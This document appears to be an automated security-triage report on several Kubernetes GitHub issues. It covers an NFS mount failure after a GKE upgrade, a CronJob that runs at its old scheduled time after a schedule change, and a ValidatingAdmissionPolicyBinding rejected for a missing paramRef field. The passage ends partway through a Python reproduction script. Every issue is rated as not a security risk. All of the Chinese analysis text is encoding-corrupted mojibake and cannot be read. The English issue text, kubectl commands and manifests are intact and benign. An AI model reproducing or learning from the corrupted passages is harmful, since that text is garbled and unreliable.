å…³é”®é”™è¯¯ä¿¡æ¯æ˜¯`MountVolume.SetUp failed ... mount failed: exit status 127`ä»¥åŠæ›´å…·ä½“çš„`chroot: failed to run command â€˜mountâ€™: No such file or directory`ã€‚è¿™è¡¨æ˜`kubelet`åœ¨å°è¯•æ‰§è¡ŒæŒ‚è½½æ“ä½œæ—¶ï¼Œåœ¨å…¶ç”¨äºæŒ‚è½½çš„å®¹å™¨åŒ–ç¯å¢ƒï¼ˆ`containerized_mounter`ï¼‰çš„`chroot`å†…éƒ¨æ‰¾ä¸åˆ°`mount`å‘½ä»¤ã€‚ç”¨æˆ·ç¡®è®¤äº†åœ¨èŠ‚ç‚¹ä¸Šï¼ˆhostè·¯å¾„ä¸‹ï¼‰`mount`å‘½ä»¤æ˜¯å­˜åœ¨çš„ã€‚

è¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå…¼å®¹æ€§æˆ–é…ç½®é—®é¢˜ï¼Œå¾ˆå¯èƒ½æ˜¯ç”±äºGKEæˆ–åº•å±‚æ“ä½œç³»ç»Ÿå‡çº§åï¼Œ`kubelet`çš„å®¹å™¨åŒ–æŒ‚è½½ç¨‹åºçš„è·¯å¾„ã€ä¾èµ–æˆ–å·¥ä½œæ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œå¯¼è‡´æ—§çš„`nfs-server-provisioner`ï¼ˆæˆ–è€…è¯´å…¶ä¾èµ–çš„NFSå®¢æˆ·ç«¯æŒ‚è½½æ–¹å¼ï¼‰ä¸æ–°ç¯å¢ƒä¸å…¼å®¹ã€‚ç”¨æˆ·é€šè¿‡åˆ‡æ¢åˆ°`nfs-csi`æ’ä»¶è§£å†³äº†é—®é¢˜ï¼Œè¿™ä¹Ÿä¾§é¢å°è¯äº†é—®é¢˜åœ¨äºæ—§çš„in-treeæˆ–éCSIé©±åŠ¨ä¸æ–°ç¯å¢ƒçš„å…¼å®¹æ€§ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¯¥é—®é¢˜æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§æ•…éšœï¼ˆNFSæ— æ³•æŒ‚è½½ï¼‰ï¼Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒæ²¡æœ‰æè¿°æ•°æ®æ³„éœ²ã€æœªæˆæƒè®¿é—®ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œç­‰å®‰å…¨é£é™©ã€‚
2.  é”™è¯¯æ—¥å¿—ä¸­æ²¡æœ‰æš´éœ²æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å‡­è¯ï¼‰ã€‚æ˜¾ç¤ºçš„IPåœ°å€ï¼ˆ10.172.14.147ï¼‰æ˜¯å†…éƒ¨NFSæœåŠ¡å™¨åœ°å€ï¼ŒæŒ‚è½½è·¯å¾„æ˜¯æ ‡å‡†çš„Kubernetes PVCè·¯å¾„ï¼Œè¿™äº›ä¿¡æ¯åœ¨é›†ç¾¤å†…éƒ¨é€šå¸¸æ˜¯å¯çŸ¥çš„ï¼Œä¸æ„æˆæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚
3.  é—®é¢˜æ˜¯ç”±ç¯å¢ƒå‡çº§ï¼ˆGKEå’ŒOSç‰ˆæœ¬ï¼‰è§¦å‘çš„å…¼å®¹æ€§é—®é¢˜ï¼Œå¹¶éç”±æ”»å‡»è€…æ¶æ„åˆ©ç”¨å¯¼è‡´ã€‚
4.  ç”¨æˆ·æœ€ç»ˆé€šè¿‡æ›´æ¢å­˜å‚¨æ’ä»¶è§£å†³äº†é—®é¢˜ï¼Œè¯´æ˜è¿™ä¸æ˜¯ä¸€ä¸ªæ™®éå­˜åœ¨çš„ã€éš¾ä»¥è§„é¿çš„å®‰å…¨ç¼ºé™·ã€‚

å› æ­¤ï¼Œè¯¥Issueæè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½å…¼å®¹æ€§é—®é¢˜ï¼Œä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# æ— éœ€ç”Ÿæˆå¤ç°è„šæœ¬ï¼Œå› ä¸ºè¯¥Issueè¢«è¯„å®šä¸ºâ€œä¸æ¶‰åŠâ€å®‰å…¨é£é™©ã€‚
# Issueæè¿°çš„æ˜¯ä¸€ä¸ªç¯å¢ƒå‡çº§å¯¼è‡´çš„å…¼å®¹æ€§é—®é¢˜ï¼Œè€Œéå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚
print("è¯¥Issueè¢«è¯„å®šä¸º'ä¸æ¶‰åŠ'å®‰å…¨é£é™©ï¼Œæ— éœ€ç”Ÿæˆå¤ç°è„šæœ¬ã€‚")
print("é—®é¢˜æ˜¯ç”±äºGKEç‰ˆæœ¬å’Œåº•å±‚OSå‡çº§å¯¼è‡´nfs-server-provisioneræŒ‚è½½å¤±è´¥ï¼Œå±äºå…¼å®¹æ€§é—®é¢˜ã€‚")
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªåœ¨ç‰¹å®šç¯å¢ƒï¼ˆGKE 1.32ï¼ŒUbuntu 24.04ï¼‰ä¸‹ä½¿ç”¨ç‰¹å®šHelm Chartï¼ˆ`kvaps/nfs-server-provisioner`ï¼‰æ—¶å‡ºç°çš„NFSæŒ‚è½½å¤±è´¥é—®é¢˜ã€‚æ ¹æœ¬åŸå› æ˜¯ç¯å¢ƒå‡çº§åï¼Œkubeletæ‰§è¡ŒæŒ‚è½½æ“ä½œçš„å†…éƒ¨æœºåˆ¶ï¼ˆcontainerized mounterï¼‰æ— æ³•æ‰¾åˆ°æˆ–æ‰§è¡Œ`mount`å‘½ä»¤ã€‚è¿™å±äºè½¯ä»¶å…¼å®¹æ€§å’Œé…ç½®é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚æ²¡æœ‰è¯æ®è¡¨æ˜æ­¤é—®é¢˜å¯è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æ‰§è¡Œæœªæˆæƒæ“ä½œã€è·å–æ•æ„Ÿä¿¡æ¯æˆ–æå‡æƒé™ã€‚å› æ­¤ï¼Œé£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼Œä¸éœ€è¦æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„POCè„šæœ¬ã€‚æä¾›çš„Pythonä»£ç ä»…ç”¨äºè¯´æ˜æ­¤ç»“è®ºã€‚

---


## Issue #130838 Cronjob may run at unexpected time in certain conditions

- Issue é“¾æ¥ï¼š[#130838](https://github.com/kubernetes/kubernetes/issues/130838)

### Issue å†…å®¹

#### What happened?

We had a job scheduled to run every day at 11pm.
We updated it to run every day at 5am and we applied the change between 5am and 11pm.
The job unexpectedly run at 11pm the same day and now run every day at 5am as expected.

#### What did you expect to happen?

The job should have run the next day a 5am.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create a cronjob and schedule it to run at a past date
- Patch its status as if it already ran in the past
- Patch it to run in the next minute
- Patch it to run in the next two minutes

Wait a minute and see that a job has unexpectedly run.
Wait another minute to see that the job runs at the expected time.

Example:
```bash
# Create a cronjob scheduled to in the past
kubectl apply -f- <<EOF
apiVersion: batch/v1
kind: CronJob
metadata:
  name: hello
spec:
  schedule: "$(date -u -d "1 day ago" +"%M %H %d %m *")"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: hello
            image: busybox:1.28
            imagePullPolicy: IfNotPresent
            command:
            - /bin/sh
            - -c
            - date; echo Hello from the Kubernetes cluster
          restartPolicy: OnFailure
EOF

# Patch its status as if it already ran in the past
yersterday=$(date -u -d "1 day ago" +"%Y-%m-%dT%H:%M:00Z")
kubectl patch cronjob hello --subresource=status -p '{"status":{"lastScheduleTime":"'"${yersterday}"'","lastSuccessfulTime":"'"${yersterday}"'"}}'
echo -e "$(kubectl get cronjob hello -o jsonpath='schedule: {.spec.schedule}\nlastScheduleTime: {.status.lastScheduleTime}')"

# Patch it to run in one minute
kubectl patch cronjob hello -p '{"spec":{"schedule":"'"$(date -u -d "1 minute" +"%M %H * * *")"'"}}'
echo "New schedule: $(kubectl get cronjob hello -o jsonpath='{.spec.schedule}')"

# Patch it to run in two minute
kubectl patch cronjob hello -p '{"spec":{"schedule":"'"$(date -u -d "2 minute" +"%M %H * * *")"'"}}'
echo "New schedule: $(kubectl get cronjob hello -o jsonpath='{.spec.schedule}')"

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº† Kubernetes CronJob åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆæ›´æ–° schedule æ—¶é—´ï¼Œå¹¶ä¸”åœ¨æ—§ schedule æ—¶é—´ç‚¹ä¹‹å‰ã€æ–° schedule æ—¶é—´ç‚¹ä¹‹ååº”ç”¨æ›´æ–°ï¼‰å¯èƒ½ä¼šåœ¨é¢„æœŸä¹‹å¤–çš„æ—¶é—´ç‚¹ï¼ˆæ—§çš„ schedule æ—¶é—´ç‚¹ï¼‰æ‰§è¡Œä¸€æ¬¡çš„é—®é¢˜ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼šè¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè°ƒåº¦é€»è¾‘çš„ bugã€‚CronJob æ§åˆ¶å™¨åœ¨å¤„ç† schedule æ›´æ–°å’Œ `lastScheduleTime` çŠ¶æ€æ—¶ï¼Œå¯èƒ½å­˜åœ¨è¾¹ç•Œæƒ…å†µå¤„ç†ä¸å½“ï¼Œå¯¼è‡´åœ¨ schedule æ›´æ”¹åçš„ç¬¬ä¸€ä¸ªå‘¨æœŸå†…ï¼Œä»ç„¶æŒ‰ç…§æ—§çš„ schedule è§¦å‘äº†ä¸€æ¬¡ Jobã€‚
2.  **è§¦å‘æ¡ä»¶**ï¼šè§¦å‘æ­¤é—®é¢˜éœ€è¦ç”¨æˆ·å…·æœ‰ä¿®æ”¹ CronJob `spec.schedule` å’Œ `status.lastScheduleTime` çš„æƒé™ã€‚è¿™é€šå¸¸æ„å‘³ç€ç”¨æˆ·éœ€è¦å¯¹ CronJob å¯¹è±¡æ‹¥æœ‰ `patch` æˆ– `update` æƒé™ã€‚
3.  **å½±å“èŒƒå›´**ï¼šå½±å“çš„æ˜¯ CronJob çš„æ‰§è¡Œæ—¶é—´ç‚¹ã€‚Job æœ¬èº«æ‰§è¡Œçš„å†…å®¹ã€æƒé™ã€èµ„æºè®¿é—®ç­‰å‡æœªæ”¹å˜ã€‚å®ƒåªæ˜¯åœ¨ç”¨æˆ·é¢„æœŸä¹‹å¤–çš„æ—¶é—´å¤šæ‰§è¡Œäº†ä¸€æ¬¡ï¼ˆæˆ–è€…è¯´ï¼Œæ²¡æœ‰æŒ‰ç…§é¢„æœŸè·³è¿‡æ—§çš„æ—¶é—´ç‚¹ï¼‰ã€‚
4.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   **æœºå¯†æ€§ (Confidentiality)**ï¼šæœªæ¶‰åŠã€‚Job æ‰§è¡Œæœ¬èº«æœªæ”¹å˜ï¼Œä¸ä¼šå¯¼è‡´é¢å¤–çš„æ•°æ®æ³„éœ²ã€‚
    *   **å®Œæ•´æ€§ (Integrity)**ï¼šæœªæ¶‰åŠã€‚Job å¯¹ç³»ç»Ÿçš„ä¿®æ”¹ï¼ˆå¦‚æœ Job æœ¬èº«æœ‰ä¿®æ”¹æ“ä½œï¼‰æ˜¯é¢„æœŸçš„ï¼Œåªæ˜¯æ‰§è¡Œæ—¶é—´ç‚¹æ„å¤–ã€‚
    *   **å¯ç”¨æ€§ (Availability)**ï¼šå¯èƒ½å­˜åœ¨è½»å¾®çš„å¯ç”¨æ€§å½±å“ã€‚å¦‚æœè¯¥ Job æ˜¯èµ„æºå¯†é›†å‹æˆ–æœ‰å‰¯ä½œç”¨ï¼ˆä¾‹å¦‚å‘é€é€šçŸ¥ã€æ¸…ç†æ•°æ®ï¼‰ï¼Œåœ¨éé¢„æœŸæ—¶é—´æ‰§è¡Œå¯èƒ½å¯¼è‡´çŸ­æš‚çš„èµ„æºç«äº‰æˆ–ä¸å¿…è¦çš„å¹²æ‰°ã€‚ä½†è¿™æ›´åå‘äºæ“ä½œæ€§é—®é¢˜è€Œéå…¸å‹çš„ DoS æ”»å‡»ã€‚æ ¹æ®æ ‡å‡† 5ï¼Œå³ä½¿è§†ä¸º DoSï¼Œåˆ©ç”¨å®ƒä¹Ÿéœ€è¦ `patch` æƒé™ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   **æƒé™æå‡/å‘½ä»¤æ‰§è¡Œ**ï¼šæœªæ¶‰åŠã€‚è¯¥ bug ä¸ä¼šæˆäºˆ Job æˆ–è§¦å‘è€…é¢å¤–çš„æƒé™ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æ‰§è¡Œéé¢„æœŸçš„å‘½ä»¤ã€‚
    *   **å¤šç§Ÿæˆ·å½±å“**ï¼šä¸€ä¸ªç”¨æˆ·è§¦å‘æ­¤ bug å½±å“çš„æ˜¯å…¶è‡ªèº«æœ‰æƒé™ç®¡ç†çš„ CronJobï¼Œä¸ä¼šç›´æ¥å½±å“å…¶ä»–ç§Ÿæˆ·çš„ CronJobï¼ˆé™¤éè¯¥ Job æœ¬èº«è®¾è®¡ä¸ºè·¨å‘½åç©ºé—´æ“ä½œï¼Œä½†è¿™ä¸æ­¤ bug æ— å…³ï¼‰ã€‚

5.  **ç»“è®º**ï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§ç¼ºé™·ï¼ˆè°ƒåº¦é€»è¾‘ bugï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å®ƒä¸ä¼šå¯¼è‡´æƒé™æå‡ã€ä¿¡æ¯æ³„éœ²ã€è¿œç¨‹ä»£ç æ‰§è¡Œç­‰å…¸å‹å®‰å…¨é£é™©ã€‚è™½ç„¶å¯èƒ½å¼•èµ·æ“ä½œä¸Šçš„æ„å¤–ï¼Œä½†ä¸æ»¡è¶³ä½é£é™©æˆ–é«˜é£é™©å®‰å…¨é—®é¢˜çš„æ ‡å‡†ã€‚ç”¨æˆ·éœ€è¦å…·å¤‡ä¿®æ”¹ CronJob çš„æƒé™æ‰èƒ½è§¦å‘æ­¤è¡Œä¸ºï¼Œè¿™æ˜¯æ­£å¸¸çš„æ“ä½œæƒé™ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
# è¯¥ Issue è¢«åˆ¤å®šä¸ºåŠŸèƒ½æ€§ç¼ºé™·è€Œéå®‰å…¨é£é™©ï¼Œå› æ­¤ä¸æä¾›å¤ç°è„šæœ¬ã€‚
# å¤ç°æ­¥éª¤å·²åœ¨ Issue å†…å®¹ä¸­é€šè¿‡ kubectl å‘½ä»¤æ¸…æ™°æè¿°ã€‚
# å¦‚æœéœ€è¦ä½¿ç”¨ Python Kubernetes å®¢æˆ·ç«¯å¤ç°è¯¥åŠŸèƒ½æ€§é—®é¢˜ï¼Œ
# å¯ä»¥å‚ç…§ Issue ä¸­çš„ kubectl å‘½ä»¤ï¼Œä½¿ç”¨ client.BatchV1Api() çš„
# create_namespaced_cron_job, patch_namespaced_cron_job,
# patch_namespaced_cron_job_status ç­‰æ–¹æ³•å®ç°ã€‚
# ä½†ç”±äºéå®‰å…¨é£é™©ï¼Œæ­¤å¤„çœç•¥å…·ä½“è„šæœ¬ã€‚

pass
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Issue æŒ‡å‡ºçš„é—®é¢˜æ˜¯ Kubernetes CronJob æ§åˆ¶å™¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼ˆåœ¨ä¸¤æ¬¡è®¡åˆ’æ‰§è¡Œæ—¶é—´ä¹‹é—´ä¿®æ”¹ scheduleï¼‰æœªèƒ½æ­£ç¡®å¤„ç†ä¸‹ä¸€æ¬¡æ‰§è¡Œæ—¶é—´ï¼Œå¯¼è‡´ä»»åŠ¡åœ¨æ—§çš„è®¡åˆ’æ—¶é—´ç‚¹æ„å¤–è¿è¡Œäº†ä¸€æ¬¡ã€‚è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å±‚é¢çš„è°ƒåº¦é€»è¾‘é”™è¯¯ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

æ”»å‡»è€…æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜æ¥æå‡æƒé™ã€æ‰§è¡Œä»»æ„ä»£ç ã€æ³„éœ²æ•æ„Ÿä¿¡æ¯æˆ–å¯¹ç³»ç»Ÿé€ æˆä¸¥é‡ç ´åæ€§çš„æ‹’ç»æœåŠ¡æ”»å‡»ã€‚è§¦å‘æ­¤è¡Œä¸ºéœ€è¦å…·å¤‡ä¿®æ”¹ CronJob èµ„æºçš„æƒé™ï¼Œè¿™æ˜¯ Kubernetes RBAC æ§åˆ¶ä¸‹çš„é¢„æœŸæ“ä½œã€‚

ç”±äºè¯¥é—®é¢˜ä¸æ„æˆå®‰å…¨é£é™©ï¼ˆè¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ï¼‰ï¼Œæ ¹æ®è¦æ±‚ï¼Œæ— éœ€æä¾›ç”¨äºå¤ç°å®‰å…¨æ¼æ´çš„ Python POC è„šæœ¬ã€‚Issue ä¸­æä¾›çš„ `kubectl` å‘½ä»¤åºåˆ—è¶³ä»¥å¤ç°è¯¥åŠŸèƒ½æ€§è¡Œä¸ºï¼Œä¾›å¼€å‘æˆ–æµ‹è¯•äººå‘˜éªŒè¯å’Œä¿®å¤è¯¥è°ƒåº¦ bugã€‚

---


## Issue #130822 Applying ValidatingAdmissionPolicyBinding with paramRef fails with `spec.paramRef.parameterNotFoundAction: Required value`

- Issue é“¾æ¥ï¼š[#130822](https://github.com/kubernetes/kubernetes/issues/130822)

### Issue å†…å®¹

#### What happened?

When trying to apply the Binding for a Validating Admission Policy referencing from a Custom Resource I get the following error (See manifests below):
`The ValidatingAdmissionPolicyBinding "test-policy-binding" is invalid: spec.paramRef.parameterNotFoundAction: Required value`

Applying the same binding without `paramRef` works as expected.

Manifests were created based on https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/ and stripped down in the example manifests below to allow for minimal reproducibility.

#### What did you expect to happen?

VAP-Binding should have been applied successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Create k8s cluster
2. Apply Manifests
    1. CRD
        <details>

        ```yaml
        apiVersion: apiextensions.k8s.io/v1
        kind: CustomResourceDefinition
        metadata:
          name: testparams.test.param
        spec:
          group: test.param
          versions:
            - name: v1
              served: true
              storage: true
              schema:
                openAPIV3Schema:
                  type: object
                  properties:
                    test:
                      type: string
          scope: Cluster
          names:
            plural: testparams
            singular: testparam
            kind: TestParam
        ```

        </details>
    2. Policy
        <details>

        ```yaml
        apiVersion: admissionregistration.k8s.io/v1
        kind: ValidatingAdmissionPolicy
        metadata:
          name: test-policy
        spec:
          failurePolicy: Fail
          matchConstraints:
            resourceRules:
            - apiGroups:
              - ""
              apiVersions:
              - v1
              operations:
              - CREATE
              - UPDATE
              resources:
              - pods
          paramKind:
            apiVersion: test.param/v1
            kind: TestParam
          validations:
          - expression: 'params.test == "test-value"'
            message: Success
        ```

        </details>
    3. Config
        <details>

        ```yaml
        apiVersion: test.param/v1
        kind: TestParam
        metadata:
          name: test-config
        test: test-value
        ```

        </details>
    4. Binding
        <details>

        ```yaml
        apiVersion: admissionregistration.k8s.io/v1
        kind: ValidatingAdmissionPolicyBinding
        metadata:
          name: test-policy-binding
        spec:
          policyName: test-policy
          paramRef:
            name: test-config
          validationActions:
          - Warn
        ```

        </details>
3. Applying the binding fails with `The ValidatingAdmissionPolicyBinding "test-policy-binding" is invalid: spec.paramRef.parameterNotFoundAction: Required value`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
# k3d/k3s
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.31.5+k3s1
# minikube
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.0
```
Tested with k3d/k3s and minikube Cluster

</details>


#### Cloud provider

-/-


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="AlmaLinux"
VERSION="9.5 (Teal Serval)"
ID="almalinux"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.5"
PLATFORM_ID="platform:el9"
PRETTY_NAME="AlmaLinux 9.5 (Teal Serval)"
ANSI_COLOR="0;34"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:almalinux:almalinux:9::baseos"
HOME_URL="https://almalinux.org/"
DOCUMENTATION_URL="https://wiki.almalinux.org/"
BUG_REPORT_URL="https://bugs.almalinux.org/"

ALMALINUX_MANTISBT_PROJECT="AlmaLinux-9"
ALMALINUX_MANTISBT_PROJECT_VERSION="9.5"
REDHAT_SUPPORT_PRODUCT="AlmaLinux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.5"
SUPPORT_END=2032-06-01
$ uname -a
Linux redacted.hostname 5.14.0-503.26.1.el9_5.x86_64 #1 SMP PREEMPT_DYNAMIC Mon Mar 3 05:56:39 EST 2025 x86_64 x86_64 x86_64 GNU/Linux
```

</details>

#### Install tools

- k3d/k3s
- minikube


#### Container runtime (CRI) and version (if applicable)

k3d/k3s: `containerd://1.7.23-k3s2`
minikube: `containerd://1.7.24`


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

-/-


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueæè¿°**: è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetesé›†ç¾¤ä¸­åº”ç”¨ä¸€ä¸ª`ValidatingAdmissionPolicyBinding`èµ„æºæ—¶é‡åˆ°çš„é—®é¢˜ã€‚å½“è¯¥Bindingä½¿ç”¨äº†`spec.paramRef`å­—æ®µæ¥å¼•ç”¨ä¸€ä¸ªè‡ªå®šä¹‰èµ„æºï¼ˆCRï¼‰ä½œä¸ºå‚æ•°æ—¶ï¼ŒAPIæœåŠ¡å™¨æ‹’ç»äº†è¯¥æ“ä½œï¼Œå¹¶è¿”å›é”™è¯¯ `spec.paramRef.parameterNotFoundAction: Required value`ã€‚å¦‚æœç§»é™¤`paramRef`å­—æ®µï¼ŒBindingå¯ä»¥æˆåŠŸåº”ç”¨ã€‚
2.  **é—®é¢˜æ€§è´¨**: è¿™ä¸ªé”™è¯¯è¡¨æ˜ï¼Œæ ¹æ®Kubernetes APIæœåŠ¡å™¨çš„éªŒè¯è§„åˆ™ï¼Œå½“`spec.paramRef`å­—æ®µè¢«æŒ‡å®šæ—¶ï¼Œå…¶å†…éƒ¨çš„`parameterNotFoundAction`å­—æ®µæ˜¯å¿…éœ€çš„ã€‚ç”¨æˆ·æä¾›çš„`ValidatingAdmissionPolicyBinding`æ¸…å•ä¸­ç¼ºå°‘äº†è¿™ä¸ªå¿…éœ€çš„å­—æ®µï¼Œå› æ­¤APIæœåŠ¡å™¨æ‹’ç»äº†è¯¥æ¸…å•ï¼Œè®¤ä¸ºå…¶æ ¼å¼æ— æ•ˆã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**:
    *   è¯¥é—®é¢˜æ˜¯ç”±äºç”¨æˆ·æä¾›çš„èµ„æºæ¸…å•ä¸ç¬¦åˆAPIè§„èŒƒï¼ˆç¼ºå°‘å¿…éœ€å­—æ®µï¼‰è€Œå¯¼è‡´çš„é…ç½®é”™è¯¯ã€‚Kubernetes APIæœåŠ¡å™¨æ­£ç¡®åœ°æ‰§è¡Œäº†éªŒè¯ï¼Œå¹¶æ‹’ç»äº†æ— æ•ˆçš„é…ç½®ã€‚
    *   è¿™å¹¶æ²¡æœ‰æš´éœ²æ–°çš„æ”»å‡»é¢ï¼Œæ²¡æœ‰å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†æ ‡å‡†çš„APIé”™è¯¯ä¿¡æ¯ï¼‰ã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œæˆ–æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚APIæœåŠ¡å™¨æ‹’ç»æ— æ•ˆé…ç½®æ˜¯é¢„æœŸè¡Œä¸ºï¼Œæ˜¯ç³»ç»Ÿå¥å£®æ€§çš„ä½“ç°ã€‚
    *   ç”¨æˆ·æœªèƒ½æˆåŠŸåº”ç”¨ä¸€ä¸ªå‡†å…¥ç­–ç•¥ï¼ˆBindingï¼‰ï¼Œä½†è¿™æœ¬èº«ä¸æ˜¯å®‰å…¨æ¼æ´ï¼Œè€Œæ˜¯é…ç½®æœªèƒ½ç”Ÿæ•ˆã€‚æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªé”™è¯¯æ¥ç»•è¿‡å®‰å…¨ç­–ç•¥æˆ–è·å¾—æœªæˆæƒçš„è®¿é—®ã€‚
    *   æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè¿™æ˜¯ä¸€ä¸ªé…ç½®é—®é¢˜æˆ–æ½œåœ¨çš„APIä½¿ç”¨æ–‡æ¡£/ç¤ºä¾‹é—®é¢˜ï¼Œè€Œä¸æ˜¯è½¯ä»¶æœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚ç”¨æˆ·æäº¤çš„é”™è¯¯é…ç½®ä¸å±äºé¡¹ç›®æœ¬èº«çš„å®‰å…¨é£é™©ï¼ˆæ ‡å‡†4ï¼‰ã€‚

4.  **ç»“è®º**: è¯¥Issueæè¿°çš„é—®é¢˜æ˜¯APIä½¿ç”¨å±‚é¢çš„é…ç½®éªŒè¯é”™è¯¯ï¼Œå¹¶éKubernetesæœ¬èº«çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import yaml
import time
import logging
import sys
from kubernetes import config, client
from kubernetes.client.rest import ApiException
import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define resource manifests from the issue
CRD_MANIFEST = """
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: testparams.test.param
spec:
  group: test.param
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            test:
              type: string
  scope: Cluster
  names:
    plural: testparams
    singular: testparam
    kind: TestParam
"""

POLICY_MANIFEST = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: test-policy
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups:
      - ""
      apiVersions:
      - v1
      operations:
      - CREATE
      - UPDATE
      resources:
      - pods
  paramKind:
    apiVersion: test.param/v1
    kind: TestParam
  validations:
  - expression: 'params.test == "test-value"'
    message: Success
"""

CONFIG_MANIFEST = """
apiVersion: test.param/v1
kind: TestParam
metadata:
  name: test-config
test: test-value
"""

# This binding is intentionally missing 'parameterNotFoundAction' to reproduce the error
BINDING_MANIFEST_INVALID = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: test-policy-binding
spec:
  policyName: test-policy
  paramRef:
    name: test-config
    # parameterNotFoundAction: Deny # This line is missing, causing the error
  validationActions:
  - Warn
"""

# Corrected binding for cleanup/reference
BINDING_MANIFEST_VALID = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: test-policy-binding
spec:
  policyName: test-policy
  paramRef:
    name: test-config
    parameterNotFoundAction: Deny # Added the required field
  validationActions:
  - Warn
"""

# Resource details for easier management
RESOURCES = [
    {"kind": "CustomResourceDefinition", "name": "testparams.test.param", "manifest": CRD_MANIFEST, "api": "ApiextensionsV1Api", "method_create": "create_custom_resource_definition", "method_delete": "delete_custom_resource_definition"},
    {"kind": "ValidatingAdmissionPolicy", "name": "test-policy", "manifest": POLICY_MANIFEST, "api": "AdmissionregistrationV1Api", "method_create": "create_validating_admission_policy", "method_delete": "delete_validating_admission_policy"},
    {"kind": "TestParam", "name": "test-config", "manifest": CONFIG_MANIFEST, "api": "CustomObjectsApi", "method_create": "create_cluster_custom_object", "method_delete": "delete_cluster_custom_object", "group": "test.param", "version": "v1", "plural": "testparams"},
    {"kind": "ValidatingAdmissionPolicyBinding", "name": "test-policy-binding", "manifest": BINDING_MANIFEST_INVALID, "api": "AdmissionregistrationV1Api", "method_create": "create_validating_admission_policy_binding", "method_delete": "delete_validating_admission_policy_binding"},
]

def cleanup_resource(api_client, resource_details):
    """Attempts to delete a Kubernetes resource."""
    api_instance = getattr(client, resource_details["api"])(api_client)
    delete_method = getattr(api_instance, resource_details["method_delete"])
    name = resource_details["name"]
    kind = resource_details["kind"]

    try:
        if kind == "TestParam":
            delete_method(
                group=resource_details["group"],
                version=resource_details["version"],
                plural=resource_details["plural"],
                name=name,
                body=client.V1DeleteOptions(grace_period_seconds=0)
            )
